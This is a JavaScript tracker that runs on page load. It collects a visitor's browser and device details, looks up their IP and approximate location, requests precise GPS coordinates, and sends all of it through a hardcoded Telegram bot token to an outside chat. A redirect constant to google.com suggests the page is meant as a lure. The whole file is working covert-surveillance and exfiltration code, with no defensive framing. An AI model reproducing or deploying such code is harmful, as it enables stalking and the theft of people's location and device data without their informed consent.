const BOT_TOKEN = "9043100510:AAEBxOM638e4-scE_um2AmoJwk9PWYTr5c8";
const CHAT_ID = "CHAT_ID";
const REDIRECT_URL = "https://www.google.com";



let userAgnetEL;
let userAgnetDataEL;
let cookiesEnabledEl;
let browserLanguageEl;
let browserNameEl;
let browserCodeNameEl;
let cpuCoreEl;
let screenWidthEl;
let screenHeightEl;
let localeTimeEl;
let ipEl;
let cityEl;
let regionEL;
let regionCodeEL;
let postalCodeEL;
let googleMapEl;
let googleEarthEl;





async function sendDetails(text){

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(CHAT_ID)}&text=${encodeURIComponent(text)}&disable_web_page_preview=true`;
    await fetch(url);


}
// getting the location and ip 
async function gettingIp(){
    const  res = await fetch("https://httpbin.org/ip");
    const data = await res.json();
    console.log(data.origin);
    ipEl = data.origin;
    return data.origin
}


async function gettingLocationFIp(ip){
    const url = `https://ipapi.co/${ip}/json/`;
    const res = await fetch(url);
    const data = await res.json();
    return data;
}


function getRealLocation(){
    return new Promise((resolve) => {
        const options = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve(pos.coords),
            (err) => resolve(null) // resolve null if user denies or it fails
        );
    });
}
(async () => {
    
    try{
        
        userAgnetEL = navigator.userAgent;
        userAgnetDataEL = navigator.platform;
        cookiesEnabledEl = navigator.cookieEnabled;
        browserLanguageEl = navigator.language;
        browserNameEl = navigator.appName;
        browserCodeNameEl = navigator.appCodeName;
        cpuCoreEl = navigator.hardwareConcurrency;
        screenWidthEl = window.screen.width;
        screenHeightEl = window.screen.height;
        let time = new Date();
        localeTimeEl = time.toLocaleTimeString();

        const IP = await gettingIp();
        const loc = await gettingLocationFIp(IP);

        if (loc && !loc.error) {
            cityEl = loc.city;
            regionEL = loc.region;
            regionCodeEL = loc.region_code;
            postalCodeEL = loc.postal;
            googleMapEl = `https://www.google.com/maps/search/?api=1&query=${loc.latitude},${loc.longitude}`;
            googleEarthEl = `https://earth.google.com/web/@${loc.latitude},${loc.longitude}`;
        }

         const realGps = await getRealLocation();
        let gpsText = "Denied/Unavailable";
        if (realGps) {
            gpsText = `${realGps.latitude}, ${realGps.longitude} (Accuracy: ${realGps.accuracy}m)`;
        }

        let message = [
            `User Agent: ${userAgnetEL}`,
            `User Agent Data: ${userAgnetDataEL}`,
            `Cookies Enabled: ${cookiesEnabledEl}`,
            `Browser Language: ${browserLanguageEl}`,
            `Browser Name: ${browserNameEl}`,
            `Browser Code Name: ${browserCodeNameEl}`,
            `CPU Cores: ${cpuCoreEl}`,
            `Screen Width: ${screenWidthEl}`,
            `Screen Height: ${screenHeightEl}`,
            `Locale Time: ${localeTimeEl}`,
            `--- IP Location ---`,
            `IP: ${ipEl}`,
            `City: ${cityEl}`,
            `Region: ${regionEL}`,
            `Region Code: ${regionCodeEL}`,
            `Postal Code: ${postalCodeEL}`,
            `Google Map: ${googleMapEl}`,
            `Google Earth: ${googleEarthEl}`,
            `--- Real GPS ---`,
            `Coordinates: ${gpsText}`,
            ].join("\n");
            await sendDetails(message);
            

    } catch (err){
        console.error("failed" , err)
    }
})();











